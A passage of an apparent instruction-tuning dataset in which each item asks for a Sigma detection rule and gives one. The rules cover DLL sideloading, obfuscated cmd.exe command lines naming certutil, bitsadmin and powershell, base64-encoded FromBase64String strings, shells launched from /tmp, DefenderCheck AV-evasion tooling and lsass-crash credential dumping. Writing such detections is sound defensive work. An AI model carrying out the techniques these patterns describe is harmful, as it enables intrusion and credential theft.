      "answer": "In order to identify when an owner was removed from an application or service principal in Azure, you should: Monitor Azure activity logs specifically for messages indicating either \"Remove owner from service principal\" or \"Remove owner from application\". This involves keeping an eye on activities within the Azure environment to detect unauthorized modifications which can be indicative of malicious attempts to alter permissions or reduce the security posture of applications and services. It's important to note that while such removal actions can be part of regular administrative duties, they might also signify malicious activities. Hence, it's advisable to verify such actions, especially if they come from unfamiliar users, user agents, or originate from unexpected hostnames. If you determine that changes made are known behaviors and causing false alarms, you can adjust this monitoring rule to avoid unnecessary alerts. This detection carries a medium level of importance due to its potential implications on security and access controls."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"ShellDispatch.dll\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"ShellDispatch.dll\", you should: monitor Windows image load events for any instances where \"ShellDispatch.dll\" is loaded in a manner that deviates from its legitimate paths. Specifically, look for the loading of this DLL that does not occur within legitimate system directories such as the user's AppData\\Local\\Temp directory or the Windows\\Temp directory. Be aware that some software installers might exhibit similar behavior and could be flagged as false positives. The detection operates at a medium alert level, indicating a balanced approach to sensitivity and the potential for misidentification.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\ShellDispatch.dll'\n    filter_main_legit_path:\n        - ImageLoaded|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Temp\\'\n        - ImageLoaded|contains: ':\\Windows\\Temp\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some installers may trigger some false positives\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\ShellDispatch.dll'\n    filter_main_legit_path:\n        - ImageLoaded|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Temp\\'\n        - ImageLoaded|contains: ':\\Windows\\Temp\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some installers may trigger some false positives\nlevel: medium\n",
      "question": "potential DLL sideloading of \"ShellDispatch.dll\"",
      "answer": "In order to detect potential DLL sideloading of \"ShellDispatch.dll\", you should: monitor Windows image load events for any instances where \"ShellDispatch.dll\" is loaded in a manner that deviates from its legitimate paths. Specifically, look for the loading of this DLL that does not occur within legitimate system directories such as the user's AppData\\Local\\Temp directory or the Windows\\Temp directory. Be aware that some software installers might exhibit similar behavior and could be flagged as false positives. The detection operates at a medium alert level, indicating a balanced approach to sensitivity and the potential for misidentification."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Alert on when a user has performed an eDiscovery search or exported a PST file from the search. This PST file usually has sensitive information including email body content.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to alert on when a user has performed an eDiscovery search or exported a PST file from the search, which usually contains sensitive information including email body content, you should focus on monitoring activities within the Microsoft 365 Threat Management service, specifically those logged by the SecurityComplianceCenter. The activity to be aware of is when an event named 'eDiscovery search started or exported' occurs, with a status of success. This means that an eDiscovery search was successfully initiated or the results were exported, possibly into a PST file. Such activities must be carefully monitored because, while exporting PST files can be a part of regular operations, it involves access to sensitive content, and thus, should always be scrutinized to ensure it aligns with legitimate purposes. The level of concern for these types of activities is considered medium, implying they should not be ignored but also recognized that they can occur as part of normal business operations. Monitoring these activities helps in identifying potentially unauthorized or malicious actions aimed at accessing or exporting sensitive data, which is associated with tactics and techniques like Data Exfiltration and Collection in cybersecurity frameworks such as MITRE ATT&CK.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\n    definition: Requires the 'eDiscovery search or exported' alert to be enabled\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'eDiscovery search started or exported'\n        status: success\n    condition: selection\nfalsepositives:\n    - PST export can be done for legitimate purposes but due to the sensitive nature of its content it must be monitored.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\n    definition: Requires the 'eDiscovery search or exported' alert to be enabled\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'eDiscovery search started or exported'\n        status: success\n    condition: selection\nfalsepositives:\n    - PST export can be done for legitimate purposes but due to the sensitive nature of its content it must be monitored.\nlevel: medium\n",
      "question": "Alert on when a user has performed an eDiscovery search or exported a PST file from the search. This PST file usually has sensitive information including email body content",
      "answer": "In order to alert on when a user has performed an eDiscovery search or exported a PST file from the search, which usually contains sensitive information including email body content, you should focus on monitoring activities within the Microsoft 365 Threat Management service, specifically those logged by the SecurityComplianceCenter. The activity to be aware of is when an event named 'eDiscovery search started or exported' occurs, with a status of success. This means that an eDiscovery search was successfully initiated or the results were exported, possibly into a PST file. Such activities must be carefully monitored because, while exporting PST files can be a part of regular operations, it involves access to sensitive content, and thus, should always be scrutinized to ensure it aligns with legitimate purposes. The level of concern for these types of activities is considered medium, implying they should not be ignored but also recognized that they can occur as part of normal business operations. Monitoring these activities helps in identifying potentially unauthorized or malicious actions aimed at accessing or exporting sensitive data, which is associated with tactics and techniques like Data Exfiltration and Collection in cybersecurity frameworks such as MITRE ATT&CK."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe, which could indicate an attempt at obfuscation or a simple typo by the developer, you should monitor for specific patterns in the process creation logs on Windows systems. Look for command line executions involving 'cmd.exe' with variations of the /c, /k, or /r flags, especially those lacking the proper spacing such as 'cmd.exe/c', '\\cmd/c', '\"cmd/c', and similar patterns with /k and /r flags. Also, pay attention to special cases like commands directly followed by 'whoami', 'powershell', 'schtasks', 'bitsadmin', or 'certutil' without the proper space after /c or /k. It's crucial to differentiate these suspicious activities from generic and legitimate uses of cmd.exe flags by excluding command lines with correct spacing after the /c, /k, or /r flags and known false positives like specific Node.js module executions within Microsoft VS Code. This detection focuses on identifying potential obfuscation techniques or errors that might signify malicious activity or misconfiguration, elevating the security alert level to high due to the nature of these anomalies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:  # missing space before the /c\n        CommandLine|contains:\n            - 'cmd.exe/c'\n            - '\\cmd/c'  # just cmd/c would be prone to false positives\n            - '\"cmd/c'\n            - 'cmd.exe/k'\n            - '\\cmd/k'  # just cmd/k would be prone to false positives\n            - '\"cmd/k'\n            - 'cmd.exe/r'\n            - '\\cmd/r'  # just cmd/r would be prone to false positives\n            - '\"cmd/r'\n    selection2: # special cases verified via Virustotal Enterprise search\n        CommandLine|contains:\n            - '/cwhoami'\n            - '/cpowershell'\n            - '/cschtasks'\n            - '/cbitsadmin'\n            - '/ccertutil'\n            - '/kwhoami'\n            - '/kpowershell'\n            - '/kschtasks'\n            - '/kbitsadmin'\n            - '/kcertutil'\n    selection3:  # missing space after the /c\n        CommandLine|contains:\n            - 'cmd.exe /c'\n            - 'cmd /c'\n            - 'cmd.exe /k'\n            - 'cmd /k'\n            - 'cmd.exe /r'\n            - 'cmd /r'\n    filter_generic:\n        CommandLine|contains:\n            - 'cmd.exe /c '\n            - 'cmd /c '\n            - 'cmd.exe /k '\n            - 'cmd /k '\n            - 'cmd.exe /r '\n            - 'cmd /r '\n    filter_fp:\n        - CommandLine|contains: 'AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules'\n        - CommandLine|endswith: 'cmd.exe/c .'\n        - CommandLine: 'cmd.exe /c'\n    condition: 1 of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:  # missing space before the /c\n        CommandLine|contains:\n            - 'cmd.exe/c'\n            - '\\cmd/c'  # just cmd/c would be prone to false positives\n            - '\"cmd/c'\n            - 'cmd.exe/k'\n            - '\\cmd/k'  # just cmd/k would be prone to false positives\n            - '\"cmd/k'\n            - 'cmd.exe/r'\n            - '\\cmd/r'  # just cmd/r would be prone to false positives\n            - '\"cmd/r'\n    selection2: # special cases verified via Virustotal Enterprise search\n        CommandLine|contains:\n            - '/cwhoami'\n            - '/cpowershell'\n            - '/cschtasks'\n            - '/cbitsadmin'\n            - '/ccertutil'\n            - '/kwhoami'\n            - '/kpowershell'\n            - '/kschtasks'\n            - '/kbitsadmin'\n            - '/kcertutil'\n    selection3:  # missing space after the /c\n        CommandLine|contains:\n            - 'cmd.exe /c'\n            - 'cmd /c'\n            - 'cmd.exe /k'\n            - 'cmd /k'\n            - 'cmd.exe /r'\n            - 'cmd /r'\n    filter_generic:\n        CommandLine|contains:\n            - 'cmd.exe /c '\n            - 'cmd /c '\n            - 'cmd.exe /k '\n            - 'cmd /k '\n            - 'cmd.exe /r '\n            - 'cmd /r '\n    filter_fp:\n        - CommandLine|contains: 'AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules'\n        - CommandLine|endswith: 'cmd.exe/c .'\n        - CommandLine: 'cmd.exe /c'\n    condition: 1 of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n",
      "answer": "In order to detect Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe, which could indicate an attempt at obfuscation or a simple typo by the developer, you should monitor for specific patterns in the process creation logs on Windows systems. Look for command line executions involving 'cmd.exe' with variations of the /c, /k, or /r flags, especially those lacking the proper spacing such as 'cmd.exe/c', '\\cmd/c', '\"cmd/c', and similar patterns with /k and /r flags. Also, pay attention to special cases like commands directly followed by 'whoami', 'powershell', 'schtasks', 'bitsadmin', or 'certutil' without the proper space after /c or /k. It's crucial to differentiate these suspicious activities from generic and legitimate uses of cmd.exe flags by excluding command lines with correct spacing after the /c, /k, or /r flags and known false positives like specific Node.js module executions within Microsoft VS Code. This detection focuses on identifying potential obfuscation techniques or errors that might signify malicious activity or misconfiguration, elevating the security alert level to high due to the nature of these anomalies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line, you should: focus on monitoring the process creation logs on Windows systems. Look for occurrences where the command line includes the specific base64 encoded string '::FromBase64String' or its variations in UTF-16 LE encoding. The presence of these strings in the process command line is a strong indicator of an attempt to execute a command or payload that was obfuscated using base64 encoding. This technique might be used by attackers to evade detection mechanisms by hiding the true nature of the command being executed. It\u2019s important to be vigilant for these signs as they can suggest a high-risk activity, although it's worth noting there could be unknown benign cases leading to false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|base64offset|contains: '::FromBase64String'\n        # UTF-16 LE\n        - CommandLine|contains:\n            - 'OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA'\n            - 'oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA'\n            - '6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|base64offset|contains: '::FromBase64String'\n        # UTF-16 LE\n        - CommandLine|contains:\n            - 'OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA'\n            - 'oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA'\n            - '6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line",
      "answer": "In order to detect usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line, you should: focus on monitoring the process creation logs on Windows systems. Look for occurrences where the command line includes the specific base64 encoded string '::FromBase64String' or its variations in UTF-16 LE encoding. The presence of these strings in the process command line is a strong indicator of an attempt to execute a command or payload that was obfuscated using base64 encoding. This technique might be used by attackers to evade detection mechanisms by hiding the true nature of the command being executed. It\u2019s important to be vigilant for these signs as they can suggest a high-risk activity, although it's worth noting there could be unknown benign cases leading to false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting dotnet.exe will execute any DLL and execute unsigned code.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect instances where dotnet.exe will execute any DLL and execute unsigned code, you should monitor process creation events on Windows systems. Focus specifically on processes where the image name ends with '\\dotnet.exe' or the original file name is identified as '.NET Host'. Additionally, pay attention to command-line parameters that end with either '.dll' or '.csproj', as these are indicative of attempts to execute code in this manner. Ensure to capture relevant details such as the computer name, the user involved, the command line used for execution, and the parent command line if available. It is important to note that system administrator activities might generate similar patterns, thus should be considered as potential false positives. The severity level for these detections is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.dll'\n            - '.csproj'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.dll'\n            - '.csproj'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium\n",
      "question": "dotnet.exe will execute any DLL and execute unsigned code",
      "answer": "In order to detect instances where dotnet.exe will execute any DLL and execute unsigned code, you should monitor process creation events on Windows systems. Focus specifically on processes where the image name ends with '\\dotnet.exe' or the original file name is identified as '.NET Host'. Additionally, pay attention to command-line parameters that end with either '.dll' or '.csproj', as these are indicative of attempts to execute code in this manner. Ensure to capture relevant details such as the computer name, the user involved, the command line used for execution, and the parent command line if available. It is important to note that system administrator activities might generate similar patterns, thus should be considered as potential false positives. The severity level for these detections is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of shells from a parent process located in a temporary (/tmp) directory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of shells from a parent process located in a temporary (/tmp) directory, you should: Monitor Linux systems for the creation of processes where the parent process originates from a directory within /tmp and leads to the execution of various shell environments. Specifically, look for parent processes with paths starting in '/tmp/' that result in the creation of processes whose executable paths end in common shell names such as '/bash', '/csh', '/dash', '/fish', '/ksh', '/sh', and '/zsh'. This scenario is flagged with a high level of concern due to its uncommon and potentially malicious nature, although there could be cases where such activity might not signify malicious intent. The detection focuses on logs associated with the creation of processes, enabling the identification of suspicious activity that aligns with tactics and techniques such as Execution and Persistence, which are often utilized in malicious operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|startswith: '/tmp/'\n        Image|endswith:\n            - '/bash'\n            - '/csh'\n            - '/dash'\n            - '/fish'\n            - '/ksh'\n            - '/sh'\n            - '/zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|startswith: '/tmp/'\n        Image|endswith:\n            - '/bash'\n            - '/csh'\n            - '/dash'\n            - '/fish'\n            - '/ksh'\n            - '/sh'\n            - '/zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of shells from a parent process located in a temporary (/tmp) directory",
      "answer": "In order to detect execution of shells from a parent process located in a temporary (/tmp) directory, you should: Monitor Linux systems for the creation of processes where the parent process originates from a directory within /tmp and leads to the execution of various shell environments. Specifically, look for parent processes with paths starting in '/tmp/' that result in the creation of processes whose executable paths end in common shell names such as '/bash', '/csh', '/dash', '/fish', '/ksh', '/sh', and '/zsh'. This scenario is flagged with a high level of concern due to its uncommon and potentially malicious nature, although there could be cases where such activity might not signify malicious intent. The detection focuses on logs associated with the creation of processes, enabling the identification of suspicious activity that aligns with tactics and techniques such as Execution and Persistence, which are often utilized in malicious operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension. This is often used as a defense evasion method..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension, often used as a defense evasion method, you should: Focus on monitoring process creation events within Windows environments. Specifically, be vigilant for any instance where the process image name ends with '\\odbcconf.exe' or the original file name is identified as 'odbcconf.exe'. Additionally, scrutinize the command line arguments for the presence of 'INSTALLDRIVER ' to pinpoint the execution attempts of the \"odbcconf\" configuration utility with the intention to install drivers. It's crucial to filter out cases where the command line includes '.dll' extensions to distinguish between legitimate and suspicious activities. This approach is designed to capture attempts to evade defenses by not using the typical \".dll\" file extension for driver installations, which is tagged under evasion techniques. False positives are considered unlikely with this high-level detection strategy.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains: 'INSTALLDRIVER '\n    filter_main_dll_ext:\n        CommandLine|contains: '.dll'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains: 'INSTALLDRIVER '\n    filter_main_dll_ext:\n        CommandLine|contains: '.dll'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension. This is often used as a defense evasion method.",
      "answer": "In order to detect execution of \"odbcconf\" with the \"INSTALLDRIVER\" action where the driver doesn't contain a \".dll\" extension, often used as a defense evasion method, you should: Focus on monitoring process creation events within Windows environments. Specifically, be vigilant for any instance where the process image name ends with '\\odbcconf.exe' or the original file name is identified as 'odbcconf.exe'. Additionally, scrutinize the command line arguments for the presence of 'INSTALLDRIVER ' to pinpoint the execution attempts of the \"odbcconf\" configuration utility with the intention to install drivers. It's crucial to filter out cases where the command line includes '.dll' extensions to distinguish between legitimate and suspicious activities. This approach is designed to capture attempts to evade defenses by not using the typical \".dll\" file extension for driver installations, which is tagged under evasion techniques. False positives are considered unlikely with this high-level detection strategy."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting enumeration of local network configuration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect enumeration of local network configuration, you should monitor process creation logs on Linux systems for the execution of command-line tools typically used for network configuration and monitoring. These tools include `firewall-cmd`, `ufw`, `iptables`, `netstat`, `ss`, `ip`, `ifconfig`, `systemd-resolve`, and `route`. Additionally, watch for any commands that contain references to `/etc/resolv.conf`, as manipulation or querying of DNS settings can be indicative of an attacker trying to understand the local network better. It's important to consider that such activities could also reflect legitimate administration tasks. The analysis of logs should focus on identifying unauthorized or unexpected invocations of these utilities, which might suggest an adversary is trying to gather information about the network's configuration and defenses. This monitoring is categorized as informational due to the possibility of false positives, which could arise from regular system administration work.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/firewall-cmd'\n            - '/ufw'\n            - '/iptables'\n            - '/netstat'\n            - '/ss'\n            - '/ip'\n            - '/ifconfig'\n            - '/systemd-resolve'\n            - '/route'\n    selection_cli:\n        CommandLine|contains: '/etc/resolv.conf'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/firewall-cmd'\n            - '/ufw'\n            - '/iptables'\n            - '/netstat'\n            - '/ss'\n            - '/ip'\n            - '/ifconfig'\n            - '/systemd-resolve'\n            - '/route'\n    selection_cli:\n        CommandLine|contains: '/etc/resolv.conf'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n",
      "question": "enumeration of local network configuration",
      "answer": "In order to detect enumeration of local network configuration, you should monitor process creation logs on Linux systems for the execution of command-line tools typically used for network configuration and monitoring. These tools include `firewall-cmd`, `ufw`, `iptables`, `netstat`, `ss`, `ip`, `ifconfig`, `systemd-resolve`, and `route`. Additionally, watch for any commands that contain references to `/etc/resolv.conf`, as manipulation or querying of DNS settings can be indicative of an attacker trying to understand the local network better. It's important to consider that such activities could also reflect legitimate administration tasks. The analysis of logs should focus on identifying unauthorized or unexpected invocations of these utilities, which might suggest an adversary is trying to gather information about the network's configuration and defenses. This monitoring is categorized as informational due to the possibility of false positives, which could arise from regular system administration work."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion, you should: Monitor for the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\DefenderCheck.exe' or the process description is 'DefenderCheck'. This activity highlights the execution of the DefenderCheck tool, which could potentially be used by adversaries to understand and evade detection by Microsoft Defender. Given the specific nature of this detection and the tool involved, false positives are considered unlikely, and such detections should be treated with a high level of concern due to their implications for anti-virus evasion efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\DefenderCheck.exe'\n        - Description: 'DefenderCheck'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.",
      "answer": "In order to detect the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion, you should: Monitor for the creation of processes on Windows systems, specifically looking for instances where the process image ends with '\\DefenderCheck.exe' or the process description is 'DefenderCheck'. This activity highlights the execution of the DefenderCheck tool, which could potentially be used by adversaries to understand and evade detection by Microsoft Defender. Given the specific nature of this detection and the tool involved, false positives are considered unlikely, and such detections should be treated with a high level of concern due to their implications for anti-virus evasion efforts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist, which adversaries might exploit to drop and execute their own DLL named \"ShellChromeAPI.dll\" via DeviceEnroller.exe, you should: Focus on monitoring process creation events within Windows environments. Specifically, track the execution of 'deviceenroller.exe' either by identifying processes where the image path ends with '\\deviceenroller.exe' or where the original file name is 'deviceenroller.exe'. Additionally, you should look for command-line executions containing the '/PhoneDeepLink' argument. It is crucial to evaluate both conditions - the execution of 'deviceenroller.exe' and the presence of '/PhoneDeepLink' in the command line - together to effectively detect this activity. Be aware that there might be unknown false positives, and this detection is considered to have a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\deviceenroller.exe'\n        - OriginalFileName: 'deviceenroller.exe'\n    selection_cli:\n        CommandLine|contains: '/PhoneDeepLink'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist. This non-existent DLL file is named \"ShellChromeAPI.dll\".\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n",
      "answer": "In order to detect the use of the PhoneDeepLink parameter to potentially sideload a DLL file that does not exist, which adversaries might exploit to drop and execute their own DLL named \"ShellChromeAPI.dll\" via DeviceEnroller.exe, you should: Focus on monitoring process creation events within Windows environments. Specifically, track the execution of 'deviceenroller.exe' either by identifying processes where the image path ends with '\\deviceenroller.exe' or where the original file name is 'deviceenroller.exe'. Additionally, you should look for command-line executions containing the '/PhoneDeepLink' argument. It is crucial to evaluate both conditions - the execution of 'deviceenroller.exe' and the presence of '/PhoneDeepLink' in the command line - together to effectively detect this activity. Be aware that there might be unknown false positives, and this detection is considered to have a medium level of importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credentials, you should: Monitor Windows application logs, specifically looking for error events from the 'Application Error' provider. The key details to watch include an Event ID of 1000, which indicates an application error. Specifically, focus on instances where the application name is 'lsass.exe', and the exception code is 'c0000001', signaling a STATUS_UNSUCCESSFUL error. This setup might flag the rare legitimate crashing of the lsass process, so it's important to assess these alerts with that consideration in mind. This monitoring strategy is crucial for identifying potentially malicious activities associated with credential theft techniques that intentionally crash the Local Security Authority Subsystem Service (LSASS) to extract credentials, positioning this approach as a high-level defensive measure against such attack methodologies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        Provider_Name: 'Application Error'\n        EventID: 1000\n        AppName: 'lsass.exe'\n        ExceptionCode: 'c0000001' # STATUS_UNSUCCESSFUL\n    condition: selection\nfalsepositives:\n    - Rare legitimate crashing of the lsass process\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\ndetection:\n    selection:\n        Provider_Name: 'Application Error'\n        EventID: 1000\n        AppName: 'lsass.exe'\n        ExceptionCode: 'c0000001' # STATUS_UNSUCCESSFUL\n    condition: selection\nfalsepositives:\n    - Rare legitimate crashing of the lsass process\nlevel: high\n",
      "question": "Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential",
      "answer": "In order to detect Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credentials, you should: Monitor Windows application logs, specifically looking for error events from the 'Application Error' provider. The key details to watch include an Event ID of 1000, which indicates an application error. Specifically, focus on instances where the application name is 'lsass.exe', and the exception code is 'c0000001', signaling a STATUS_UNSUCCESSFUL error. This setup might flag the rare legitimate crashing of the lsass process, so it's important to assess these alerts with that consideration in mind. This monitoring strategy is crucial for identifying potentially malicious activities associated with credential theft techniques that intentionally crash the Local Security Authority Subsystem Service (LSASS) to extract credentials, positioning this approach as a high-level defensive measure against such attack methodologies."
    }
  },
  {
